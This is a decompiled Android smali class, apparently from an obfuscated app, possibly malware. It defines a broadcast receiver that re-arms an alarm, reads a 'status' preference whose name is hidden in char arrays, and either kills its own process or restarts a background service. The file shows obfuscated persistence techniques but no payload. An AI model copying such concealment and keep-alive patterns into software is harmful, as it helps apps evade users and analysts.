.class public Lkosp/ynqekv/swdt/Dwrqyorad;
.super Landroid/content/BroadcastReceiver;
.source "Dwrqyorad.java"


# instance fields
.field private alarm:Lkosp/ynqekv/swdt/Xnlyhjvxo;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 8
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 5
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v4, 0x0

    .line 14
    new-instance v2, Lkosp/ynqekv/swdt/Xnlyhjvxo;

    invoke-direct {v2}, Lkosp/ynqekv/swdt/Xnlyhjvxo;-><init>()V

    iput-object v2, p0, Lkosp/ynqekv/swdt/Dwrqyorad;->alarm:Lkosp/ynqekv/swdt/Xnlyhjvxo;

    .line 15
    iget-object v2, p0, Lkosp/ynqekv/swdt/Dwrqyorad;->alarm:Lkosp/ynqekv/swdt/Xnlyhjvxo;

    invoke-virtual {v2, p1}, Lkosp/ynqekv/swdt/Xnlyhjvxo;->SetAlarm(Landroid/content/Context;)V

    .line 17
    new-instance v2, Ljava/lang/String;

    const/4 v3, 0x5

    new-array v3, v3, [C

    fill-array-data v3, :array_0

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {p1, v2, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 19
    .local v0, "settings":Landroid/content/SharedPreferences;
    new-instance v2, Ljava/lang/String;

    const/4 v3, 0x6

    new-array v3, v3, [C

    fill-array-data v3, :array_1

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    invoke-interface {v0, v2, v4}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v1

    .line 20
    .local v1, "status":I
    const/16 v2, 0x4d

    if-ne v1, v2, :cond_0

    .line 21
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v2

    invoke-static {v2}, Landroid/os/Process;->killProcess(I)V

    .line 25
    :goto_0
    return-void

    .line 23
    :cond_0
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lkosp/ynqekv/swdt/Fxjmcxqw;

    invoke-direct {v2, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 17
    :array_0
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data

    .line 19
    nop

    :array_1
    .array-data 2
        0x73s
        0x74s
        0x61s
        0x74s
        0x75s
        0x73s
    .end array-data
.end method
